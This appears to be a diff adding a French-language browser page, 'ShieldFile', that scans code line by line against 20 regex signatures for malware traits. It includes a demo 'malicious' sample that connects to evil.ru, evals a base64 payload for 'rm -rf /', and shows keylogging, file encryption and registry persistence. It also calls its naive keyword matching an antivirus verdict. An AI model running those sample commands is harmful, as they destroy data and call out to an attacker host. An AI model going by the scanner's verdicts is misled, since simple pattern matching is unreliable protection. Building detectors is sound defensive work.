@@ -1,0 +1,382 @@
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+.av{padding:1.5rem 1rem;font-family:var(--font-sans);max-width:720px}
+.hdr{display:flex;align-items:center;gap:14px;margin-bottom:1.75rem;padding-bottom:1.25rem;border-bottom:0.5px solid var(--color-border-tertiary)}
+.logo-wrap{position:relative;flex-shrink:0}
+.logo{width:48px;height:48px;background:linear-gradient(135deg,#1a4fa3,#2563d4);border-radius:12px;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(26,79,163,0.25)}
+.hinfo{flex:1}
+.htxt{font-size:20px;font-weight:500;color:var(--color-text-primary);letter-spacing:-0.3px}
+.hsub{font-size:12px;color:var(--color-text-secondary);margin-top:2px}
+.hbadge{font-size:10px;background:#e6f1fb;color:#0c447c;padding:2px 8px;border-radius:10px;font-weight:500;margin-left:8px;vertical-align:middle}
+
+.drop-zone{border:1.5px dashed var(--color-border-secondary);border-radius:var(--border-radius-lg);padding:2.5rem 1rem;text-align:center;cursor:pointer;transition:all 0.15s;margin-bottom:1rem;position:relative;overflow:hidden}
+.drop-zone:hover,.drop-zone.over{background:var(--color-background-secondary);border-color:#1a4fa3}
+.fp-svg{width:56px;height:56px;margin:0 auto 12px;opacity:0.18}
+.drop-zone.over .fp-svg{opacity:0.35}
+.drop-label{font-size:15px;color:var(--color-text-primary);margin-bottom:4px;font-weight:500}
+.drop-sub{font-size:12px;color:var(--color-text-secondary)}
+#file-input{display:none}
+
+.tabs{display:flex;gap:0;margin-bottom:1rem;border-bottom:0.5px solid var(--color-border-tertiary)}
+.tab{padding:7px 16px;font-size:13px;cursor:pointer;color:var(--color-text-secondary);border-bottom:2px solid transparent;margin-bottom:-0.5px;transition:color 0.1s}
+.tab.active{color:#1a4fa3;border-bottom-color:#1a4fa3;font-weight:500}
+.tab-panel{display:none}
+.tab-panel.active{display:block}
+
+.editor-wrap{border:0.5px solid var(--color-border-secondary);border-radius:var(--border-radius-lg);overflow:hidden;margin-bottom:1rem}
+.editor-bar{background:var(--color-background-secondary);padding:6px 12px;font-size:12px;color:var(--color-text-secondary);border-bottom:0.5px solid var(--color-border-tertiary);display:flex;justify-content:space-between;align-items:center}
+.ebar-dot{width:8px;height:8px;border-radius:50%;background:#1a4fa3;display:inline-block;margin-right:5px}
+textarea{display:block;width:100%;min-height:150px;padding:12px;background:var(--color-background-primary);color:var(--color-text-primary);font-family:var(--font-mono);font-size:13px;line-height:1.7;border:none;outline:none;resize:vertical}
+
+.btn-row{display:flex;gap:8px;align-items:center;margin-bottom:1.25rem;flex-wrap:wrap}
+.btn{padding:9px 22px;background:#1a4fa3;color:#fff;border:none;border-radius:var(--border-radius-md);font-size:14px;cursor:pointer;font-weight:500;display:flex;align-items:center;gap:6px;transition:background 0.15s}
+.btn:hover{background:#163f82}
+.btn:disabled{background:var(--color-background-secondary);color:var(--color-text-tertiary);cursor:not-allowed}
+.btn-sm{padding:7px 14px;background:transparent;color:var(--color-text-secondary);border:0.5px solid var(--color-border-secondary);border-radius:var(--border-radius-md);font-size:13px;cursor:pointer;transition:all 0.1s}
+.btn-sm:hover{background:var(--color-background-secondary);color:var(--color-text-primary)}
+
+.file-info{background:var(--color-background-secondary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-md);padding:10px 14px;margin-bottom:1rem;font-size:13px;color:var(--color-text-secondary);display:none;align-items:center;gap:12px}
+.file-ext-badge{font-size:10px;font-weight:500;padding:2px 7px;border-radius:5px;background:#e6f1fb;color:#0c447c}
+
+.prog-wrap{margin-bottom:1rem;display:none}
+.prog-lbl{font-size:12px;color:var(--color-text-secondary);margin-bottom:5px;display:flex;justify-content:space-between}
+.prog-bar{height:5px;background:var(--color-background-secondary);border-radius:3px;overflow:hidden}
+.prog-fill{height:100%;background:#1a4fa3;border-radius:3px;transition:width 0.08s;width:0}
+
+.verdict{padding:11px 16px;border-radius:var(--border-radius-md);font-size:13px;font-weight:500;margin-bottom:1rem;display:none;display:none;align-items:center;gap:8px}
+.verdict.clean{background:#eaf3de;color:#3b6d11}
+.verdict.infected{background:#fcebeb;color:#a32d2d}
+.verdict.suspect{background:#faeeda;color:#854f0b}
+
+.results{display:none}
+.cards{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:8px;margin-bottom:1rem}
+.card{background:var(--color-background-secondary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-md);padding:12px;text-align:center}
+.card-num{font-size:24px;font-weight:500;color:var(--color-text-primary)}
+.card-lbl{font-size:11px;color:var(--color-text-secondary);margin-top:3px}
+.card.d .card-num{color:#c0392b}
+.card.w .card-num{color:#e67e22}
+.card.ok .card-num{color:#1a7f37}
+
+.lines-header{font-size:12px;font-weight:500;color:var(--color-text-secondary);margin-bottom:6px;padding:0 2px}
+.lines-wrap{border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-md);overflow:hidden;max-height:340px;overflow-y:auto}
+.line-row{display:flex;align-items:flex-start;font-size:12.5px;border-bottom:0.5px solid var(--color-border-tertiary);transition:background 0.1s}
+.line-row:last-child{border-bottom:none}
+.lnum{min-width:44px;padding:6px 8px;background:var(--color-background-secondary);color:var(--color-text-tertiary);text-align:right;border-right:0.5px solid var(--color-border-tertiary);font-family:var(--font-mono);user-select:none;font-size:11px}
+.lcode{flex:1;padding:6px 10px;white-space:pre;overflow:hidden;text-overflow:ellipsis;font-family:var(--font-mono);color:var(--color-text-primary)}
+.lbadge{padding:5px 8px;display:flex;align-items:center;min-width:110px;justify-content:flex-end}
+.line-row.threat{background:rgba(192,57,43,0.06)}
+.line-row.threat .lcode{color:#c0392b}
+.line-row.threat:hover{background:rgba(192,57,43,0.12)}
+.line-row.warning{background:rgba(230,126,34,0.06)}
+.line-row.warning .lcode{color:#c47a1a}
+.line-row.warning:hover{background:rgba(230,126,34,0.12)}
+
+.badge{display:inline-flex;align-items:center;font-size:10.5px;padding:2px 8px;border-radius:10px;font-weight:500}
+.badge.ok{background:#eaf3de;color:#3b6d11}
+.badge.threat{background:#fcebeb;color:#a32d2d}
+.badge.warn{background:#faeeda;color:#854f0b}
+
+.detail-panel{margin-top:1rem;border:0.5px solid var(--color-border-secondary);border-radius:var(--border-radius-lg);padding:16px;display:none;background:var(--color-background-secondary)}
+.detail-title{font-size:14px;font-weight:500;color:var(--color-text-primary);margin-bottom:10px;display:flex;align-items:center;gap:8px}
+.detail-title-badge{font-size:10px;padding:2px 8px;border-radius:8px;background:#fcebeb;color:#a32d2d;font-weight:500}
+.ditem{font-size:12.5px;padding:4px 0;display:flex;gap:10px;border-bottom:0.5px solid var(--color-border-tertiary)}
+.ditem:last-child{border-bottom:none}
+.ditem span:first-child{min-width:90px;color:var(--color-text-tertiary);font-size:12px}
+
+.warn-banner{background:#faeeda;color:#854f0b;border-radius:var(--border-radius-md);padding:8px 14px;font-size:12px;margin-bottom:1rem;display:none}
+.sf-footer{font-size:11px;color:var(--color-text-tertiary);margin-top:1.5rem;display:flex;align-items:center;gap:8px;padding-top:1rem;border-top:0.5px solid var(--color-border-tertiary)}
+</style>
+
+<div class="av">
+  <h2 class="sr-only">ShieldFile — Antivirus analyse ligne par ligne</h2>
+
+  <div class="hdr">
+    <div class="logo-wrap">
+      <div class="logo">
+        <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
+          <path d="M14 3L4 7.5V14c0 5.8 4.1 11.2 10 12.8 5.9-1.6 10-7 10-12.8V7.5L14 3z" fill="white" opacity="0.15"/>
+          <path d="M14 3L4 7.5V14c0 5.8 4.1 11.2 10 12.8 5.9-1.6 10-7 10-12.8V7.5L14 3z" stroke="white" stroke-width="1.5"/>
+          <path d="M10 14l3 3 6-6" stroke="white" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+    </div>
+    <div class="hinfo">
+      <div class="htxt">ShieldFile <span class="hbadge">v1.0</span></div>
+      <div class="hsub">Analyse statique ligne par ligne · 20 catégories · Max 1 Go</div>
+    </div>
+  </div>
+
+  <div class="warn-banner" id="warn-banner">⚠ Fichier volumineux — seules les lignes texte lisibles sont analysées.</div>
+
+  <div class="tabs">
+    <div class="tab active" data-tab="file">Fichier</div>
+    <div class="tab" data-tab="code">Code direct</div>
+  </div>
+
+  <div class="tab-panel active" id="tab-file">
+    <div class="drop-zone" id="drop-zone">
+      <svg class="fp-svg" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <ellipse cx="40" cy="40" rx="18" ry="26" stroke="#1a4fa3" stroke-width="3.5" fill="none"/>
+        <path d="M40 14c-8 0-14 7-14 17 0 5 1.5 9.5 4 12.5" stroke="#1a4fa3" stroke-width="3" stroke-linecap="round" fill="none"/>
+        <path d="M40 14c8 0 14 7 14 17 0 5-1.5 9.5-4 12.5" stroke="#1a4fa3" stroke-width="3" stroke-linecap="round" fill="none"/>
+        <path d="M34 28c0-3.3 2.7-6 6-6s6 2.7 6 6c0 4-1.5 8-3 11" stroke="#1a4fa3" stroke-width="2.5" stroke-linecap="round" fill="none"/>
+        <path d="M46 28c0-3.3-2.7-6-6-6" stroke="#1a4fa3" stroke-width="2.5" stroke-linecap="round" fill="none"/>
+        <path d="M40 22v6" stroke="#1a4fa3" stroke-width="2.5" stroke-linecap="round"/>
+        <path d="M28 38c0 7 5.4 13 12 13s12-6 12-13" stroke="#1a4fa3" stroke-width="2.5" stroke-linecap="round" fill="none"/>
+        <path d="M33 42c0 3.9 3.1 7 7 7s7-3.1 7-7" stroke="#1a4fa3" stroke-width="2.5" stroke-linecap="round" fill="none"/>
+      </svg>
+      <div class="drop-label">Glissez un fichier ici ou cliquez pour parcourir</div>
+      <div class="drop-sub" style="margin-top:4px">.py .js .sh .bat .ps1 .php .rb .txt .html .vbs .c .cpp .cs .java + tout fichier texte — max 1 Go</div>
+      <input type="file" id="file-input">
+    </div>
+    <div class="file-info" id="file-info">
+      <span id="file-icon" style="font-size:22px">📄</span>
+      <div style="flex:1">
+        <div id="file-name" style="color:var(--color-text-primary);font-weight:500;margin-bottom:2px"></div>
+        <div id="file-meta" style="font-size:12px"></div>
+      </div>
+      <span class="file-ext-badge" id="file-ext-badge"></span>
+    </div>
+  </div>
+
+  <div class="tab-panel" id="tab-code">
+    <div class="editor-wrap">
+      <div class="editor-bar">
+        <span><span class="ebar-dot"></span>code_source.txt</span>
+        <span id="lcount">0 lignes</span>
+      </div>
+      <textarea id="code-input" spellcheck="false" placeholder="Collez votre code ici..."></textarea>
+    </div>
+  </div>
+
+  <div class="btn-row">
+    <button class="btn" id="scan-btn">
+      <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><circle cx="6" cy="6" r="4.5" stroke="white" stroke-width="1.5"/><path d="M10 10l2.5 2.5" stroke="white" stroke-width="1.5" stroke-linecap="round"/></svg>
+      Analyser
+    </button>
+    <button class="btn-sm" id="sample-btn">Exemple malveillant</button>
+    <button class="btn-sm" id="clear-btn">Effacer</button>
+  </div>
+
+  <div class="verdict" id="verdict"></div>
+
+  <div class="prog-wrap" id="prog-wrap">
+    <div class="prog-lbl"><span id="prog-txt">Analyse...</span><span id="prog-pct">0%</span></div>
+    <div class="prog-bar"><div class="prog-fill" id="prog-fill"></div></div>
+  </div>
+
+  <div class="results" id="results">
+    <div class="cards" id="cards"></div>
+    <div class="lines-header" id="lines-header"></div>
+    <div class="lines-wrap" id="lines-wrap"></div>
+    <div class="detail-panel" id="detail-panel">
+      <div class="detail-title">
+        <span id="dtitle"></span>
+        <span class="detail-title-badge" id="dseverity"></span>
+      </div>
+      <div id="dbody"></div>
+    </div>
+  </div>
+
+  <div class="sf-footer">
+    <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M6 1L1 3.5V6c0 2.8 2 5 5 5.5 3-.5 5-2.7 5-5.5V3.5L6 1z" stroke="#1a4fa3" stroke-width="1.2"/></svg>
+    ShieldFile · Moteur de détection statique · Signatures ouvertes SF-001 à SF-020
+  </div>
+</div>
+
+<script>
+const SIGS = [
+  {r:/eval\s*\(/,s:'threat',n:'Trojan.Script.Eval',d:'Exécution dynamique via eval() — obfuscation classique',k:'SF-001',c:'Obfuscation'},
+  {r:/exec\s*\(/,s:'threat',n:'Backdoor.Shell.Exec',d:'Appel système — exécution de commandes arbitraires',k:'SF-002',c:'Shell Injection'},
+  {r:/base64[_\.]dec|atob\s*\(/,s:'threat',n:'Trojan.Obfuscated.Base64',d:'Décodage base64 — cache souvent du code malveillant',k:'SF-003',c:'Obfuscation'},
+  {r:/os\.system|subprocess\.(call|run|Popen)|spawn\s*\(/,s:'threat',n:'Backdoor.OS.Command',d:'Commande système directe — exécution de processus',k:'SF-004',c:'OS Execution'},
+  {r:/socket\.(connect|bind)|raw_socket|SOCK_RAW/,s:'threat',n:'Trojan.Net.RawSocket',d:'Socket réseau brut — exfiltration ou C2',k:'SF-005',c:'Network C2'},
+  {r:/keylog|GetAsyncKeyState|SetWindowsHookEx/i,s:'threat',n:'Spyware.Keylogger',d:'Enregistrement de frappes — vol de mots de passe',k:'SF-006',c:'Spyware'},
+  {r:/encrypt.*file|\.encrypt\(|Fernet|AES.*file|ransomware/i,s:'threat',n:'Ransomware.Encrypt',d:'Chiffrement de fichiers — indicateur de ransomware',k:'SF-007',c:'Ransomware'},
+  {r:/rm\s+-rf|shutil\.rmtree|format\s+c:|del\s+\/[fqs]/i,s:'threat',n:'Wiper.FileDestruct',d:'Suppression récursive — destructeur de données',k:'SF-008',c:'Wiper'},
+  {r:/while\s*(true|1)\s*[:{].*fork|forkbomb|\(\s*\)\s*\{\s*:\|:/i,s:'threat',n:'DoS.ForkBomb',d:'Fork bomb — déni de service local',k:'SF-009',c:'DoS'},
+  {r:/union\s+select|drop\s+table|'.*or.*'.*=/i,s:'threat',n:'Exploit.SQLi',d:'Injection SQL — attaque base de données',k:'SF-010',c:'SQL Injection'},
+  {r:/<script[^>]*>.*?(alert|document\.cookie|eval)|onerror\s*=|onload\s*=/i,s:'threat',n:'Exploit.XSS',d:'Cross-Site Scripting',k:'SF-011',c:'XSS'},
+  {r:/\.\.\/\.\.\/|\.\.\\\.\.\\|\/etc\/passwd|\/etc\/shadow/,s:'threat',n:'Exploit.PathTraversal',d:'Traversée de répertoire',k:'SF-012',c:'Path Traversal'},
+  {r:/CreateRemoteThread|VirtualAllocEx|WriteProcessMemory/,s:'threat',n:'Trojan.Inject.Process',d:'Injection de processus Windows',k:'SF-013',c:'Process Injection'},
+  {r:/HKEY_.*\\Run|CurrentVersion\\Run/i,s:'threat',n:'Trojan.Persistence.Registry',d:'Persistance registre Windows',k:'SF-014',c:'Persistence'},
+  {r:/wget\s+http|curl\s+-[sO].*http|urllib\.request\.urlretrieve/i,s:'warning',n:'Downloader.Suspicious',d:'Téléchargement distant — potentiel dropper',k:'SF-015',c:'Downloader'},
+  {r:/chmod\s+777|chown.*root|sudo\s+-n|NOPASSWD/i,s:'warning',n:'Exploit.PrivEsc',d:'Élévation de privilèges',k:'SF-016',c:'Privilege Escalation'},
+  {r:/nohup|disown|2>&1.*&$|\/dev\/null.*&/,s:'warning',n:'Trojan.Persistence.Daemon',d:'Exécution silencieuse en arrière-plan',k:'SF-017',c:'Persistence'},
+  {r:/password\s*=\s*["'][^"']{3,}["']|passwd\s*=\s*["'][^"']{3,}["']/i,s:'warning',n:'InfoLeak.HardcodedPass',d:'Mot de passe en clair dans le code',k:'SF-018',c:'Info Leak'},
+  {r:/md5\s*\(|hashlib\.md5|CryptoJS\.MD5/i,s:'warning',n:'Crypto.WeakHash',d:'Hachage MD5 faible',k:'SF-019',c:'Weak Crypto'},
+  {r:/ActiveXObject|WScript\.Shell|Shell\.Application|powershell\s+-enc/i,s:'threat',n:'Trojan.Windows.ActiveX',d:'ActiveX / WScript — vecteur Windows classique',k:'SF-020',c:'Windows Script'},
+];
+
+const SAMPLE=`import os, socket, base64, subprocess
+from cryptography.fernet import Fernet
+
+s = socket.connect(("evil.ru", 4444))
+payload = base64.decode("aW1wb3J0IG9zCm9zLnN5c3RlbSgicm0gLXJmIC8iKQ==")
+eval(payload)
+keylog_start("capture_all_keys")
+encrypt_files("/home/user/documents")
+os.system("rm -rf /tmp/logs")
+reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+WriteProcessMemory(handle, addr, shellcode, len(shellcode), None)
+password = "SuperSecret123"
+while True:
+    fork()`;
+
+const MAX=1*1024*1024*1024;
+let currentCode='',activeTab='file';
+
+document.querySelectorAll('.tab').forEach(t=>{
+  t.addEventListener('click',()=>{
+    document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));
+    document.querySelectorAll('.tab-panel').forEach(x=>x.classList.remove('active'));
+    t.classList.add('active');
+    document.getElementById('tab-'+t.dataset.tab).classList.add('active');
+    activeTab=t.dataset.tab;
+  });
+});
+
+const dropZone=document.getElementById('drop-zone');
+const fileInput=document.getElementById('file-input');
+dropZone.addEventListener('click',()=>fileInput.click());
+dropZone.addEventListener('dragover',e=>{e.preventDefault();dropZone.classList.add('over')});
+dropZone.addEventListener('dragleave',()=>dropZone.classList.remove('over'));
+dropZone.addEventListener('drop',e=>{e.preventDefault();dropZone.classList.remove('over');if(e.dataTransfer.files[0])loadFile(e.dataTransfer.files[0])});
+fileInput.addEventListener('change',()=>{if(fileInput.files[0])loadFile(fileInput.files[0])});
+
+function fmtSize(b){if(b<1024)return b+' o';if(b<1048576)return(b/1024).toFixed(1)+' Ko';if(b<1073741824)return(b/1048576).toFixed(1)+' Mo';return(b/1073741824).toFixed(2)+' Go';}
+
+function loadFile(file){
+  if(file.size>MAX){alert('Fichier trop grand (max 1 Go)');return;}
+  const ext=file.name.split('.').pop().toLowerCase();
+  const icons={py:'🐍',js:'📜',sh:'⚙️',bat:'🪟',ps1:'🔵',php:'🐘',rb:'💎',html:'🌐',htm:'🌐',vbs:'🪟',txt:'📄',c:'⚙️',cpp:'⚙️',cs:'💜',java:'☕',lua:'🌙',pl:'🐪'};
+  document.getElementById('warn-banner').style.display=file.size>10*1024*1024?'block':'none';
+  new FileReader().onload=e=>{
+    currentCode=e.target.result;
+    const lines=currentCode.split('\n').length;
+    const fi=document.getElementById('file-info');
+    fi.style.display='flex';
+    document.getElementById('file-icon').textContent=icons[ext]||'📄';
+    document.getElementById('file-name').textContent=file.name;
+    document.getElementById('file-meta').textContent=fmtSize(file.size)+' · '+lines.toLocaleString()+' lignes';
+    document.getElementById('file-ext-badge').textContent=ext.toUpperCase();
+    document.getElementById('verdict').style.display='none';
+    document.getElementById('results').style.display='none';
+    document.getElementById('detail-panel').style.display='none';
+  };
+  const fr=new FileReader();fr.onload=e=>{currentCode=e.target.result;const lines=currentCode.split('\n').length;document.getElementById('file-info').style.display='flex';document.getElementById('file-icon').textContent=icons[ext]||'📄';document.getElementById('file-name').textContent=file.name;document.getElementById('file-meta').textContent=fmtSize(file.size)+' · '+lines.toLocaleString()+' lignes';document.getElementById('file-ext-badge').textContent=ext.toUpperCase();document.getElementById('verdict').style.display='none';document.getElementById('results').style.display='none';document.getElementById('detail-panel').style.display='none';};fr.readAsText(file);
+}
+
+document.getElementById('code-input').addEventListener('input',function(){const n=this.value.split('\n').length;document.getElementById('lcount').textContent=n.toLocaleString()+' ligne'+(n>1?'s':'');});
+
+document.getElementById('sample-btn').addEventListener('click',()=>{
+  document.querySelectorAll('.tab')[1].click();
+  document.getElementById('code-input').value=SAMPLE;
+  currentCode=SAMPLE;
+  document.getElementById('lcount').textContent=SAMPLE.split('\n').length+' lignes';
+  document.getElementById('results').style.display='none';
+  document.getElementById('verdict').style.display='none';
+});
+
+document.getElementById('clear-btn').addEventListener('click',()=>{
+  document.getElementById('code-input').value='';currentCode='';
+  document.getElementById('lcount').textContent='0 lignes';
+  document.getElementById('file-info').style.display='none';
+  document.getElementById('results').style.display='none';
+  document.getElementById('verdict').style.display='none';
+  document.getElementById('prog-wrap').style.display='none';
+  document.getElementById('warn-banner').style.display='none';
+  fileInput.value='';
+});
+
+document.getElementById('scan-btn').addEventListener('click',()=>{
+  const code=activeTab==='file'?currentCode:document.getElementById('code-input').value;
+  if(!code.trim()){alert('Aucun fichier ou code à analyser.');return;}
+  startScan(code);
+});
+
+function startScan(code){
+  const lines=code.split('\n');
+  document.getElementById('scan-btn').disabled=true;
+  document.getElementById('prog-wrap').style.display='block';
+  document.getElementById('results').style.display='none';
+  document.getElementById('verdict').style.display='none';
+  document.getElementById('detail-panel').style.display='none';
+  document.getElementById('lines-wrap').innerHTML='';
+  const lr=[];
+  const CHUNK=lines.length>100000?500:lines.length>10000?100:20;
+  let i=0;
+  function next(){
+    const end=Math.min(i+CHUNK,lines.length);
+    for(;i<end;i++){const r=analyze(lines[i],i);lr.push(r);if(r.severity!=='clean')renderLine(r);}
+    const pct=Math.round(i/lines.length*100);
+    document.getElementById('prog-fill').style.width=pct+'%';
+    document.getElementById('prog-pct').textContent=pct+'%';
+    document.getElementById('prog-txt').textContent='Ligne '+i.toLocaleString()+' / '+lines.length.toLocaleString();
+    if(i<lines.length)setTimeout(next,0);else finish(lr);
+  }
+  next();
+}
+
+function analyze(line,idx){
+  for(const sig of SIGS){if(sig.r.test(line))return{line,idx,severity:sig.s,sig};}
+  return{line,idx,severity:'clean',sig:null};
+}
+
+function renderLine(r){
+  const row=document.createElement('div');
+  row.className='line-row '+r.severity;
+  row.innerHTML=`<div class="lnum">${(r.idx+1).toLocaleString()}</div><div class="lcode">${esc(r.line||' ')}</div><div class="lbadge">${bdg(r)}</div>`;
+  if(r.sig){row.style.cursor='pointer';row.addEventListener('click',()=>showDetail(r));}
+  document.getElementById('lines-wrap').appendChild(row);
+}
+
+function bdg(r){
+  if(r.severity==='threat')return'<span class="badge threat">Menace</span>';
+  if(r.severity==='warning')return'<span class="badge warn">Suspect</span>';
+  return'<span class="badge ok">Propre</span>';
+}
+
+function finish(lr){
+  const threats=lr.filter(r=>r.severity==='threat').length;
+  const warnings=lr.filter(r=>r.severity==='warning').length;
+  const clean=lr.filter(r=>r.severity==='clean').length;
+  document.getElementById('cards').innerHTML=`
+    <div class="card"><div class="card-num">${lr.length.toLocaleString()}</div><div class="card-lbl">Lignes</div></div>
+    <div class="card d"><div class="card-num">${threats}</div><div class="card-lbl">Menaces</div></div>
+    <div class="card w"><div class="card-num">${warnings}</div><div class="card-lbl">Suspects</div></div>
+    <div class="card ok"><div class="card-num">${clean.toLocaleString()}</div><div class="card-lbl">Propres</div></div>`;
+  if(threats===0&&warnings===0){
+    document.getElementById('lines-wrap').innerHTML='<div style="padding:1.2rem;text-align:center;font-size:13px;color:var(--color-text-secondary)">Aucune ligne suspecte détectée</div>';
+  } else {
+    document.getElementById('lines-header').textContent='Lignes suspectes — cliquez pour les détails';
+  }
+  const v=document.getElementById('verdict');
+  v.style.display='flex';
+  if(threats>0){v.className='verdict infected';v.textContent='⚠  INFECTÉ — '+threats+' menace(s) critique(s)'+(warnings>0?' + '+warnings+' suspect(s)':'');}
+  else if(warnings>0){v.className='verdict suspect';v.textContent='⚠  SUSPECT — '+warnings+' élément(s) à vérifier';}
+  else{v.className='verdict clean';v.textContent='✓  PROPRE — aucune menace sur '+lr.length.toLocaleString()+' lignes';}
+  document.getElementById('results').style.display='block';
+  document.getElementById('prog-txt').textContent='Analyse terminée';
+  document.getElementById('scan-btn').disabled=false;
+}
+
+function showDetail(r){
+  const s=r.sig;
+  document.getElementById('detail-panel').style.display='block';
+  document.getElementById('dtitle').textContent=s.n;
+  document.getElementById('dseverity').textContent=r.severity==='threat'?'Menace critique':'Avertissement';
+  document.getElementById('dseverity').style.background=r.severity==='threat'?'#fcebeb':'#faeeda';
+  document.getElementById('dseverity').style.color=r.severity==='threat'?'#a32d2d':'#854f0b';
+  document.getElementById('dbody').innerHTML=`
+    <div class="ditem"><span>Ligne</span><span>${(r.idx+1).toLocaleString()}</span></div>
+    <div class="ditem"><span>Catégorie</span><span>${s.c}</span></div>
+    <div class="ditem"><span>Description</span><span>${s.d}</span></div>
+    <div class="ditem"><span>Signature</span><span style="font-family:var(--font-mono)">${s.k}</span></div>
+    <div class="ditem"><span>Code</span><span style="font-family:var(--font-mono);color:var(--color-text-primary);word-break:break-all">${esc(r.line.trim())}</span></div>`;
+  document.getElementById('detail-panel').scrollIntoView({behavior:'smooth',block:'nearest'});
+}
+
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+</script>
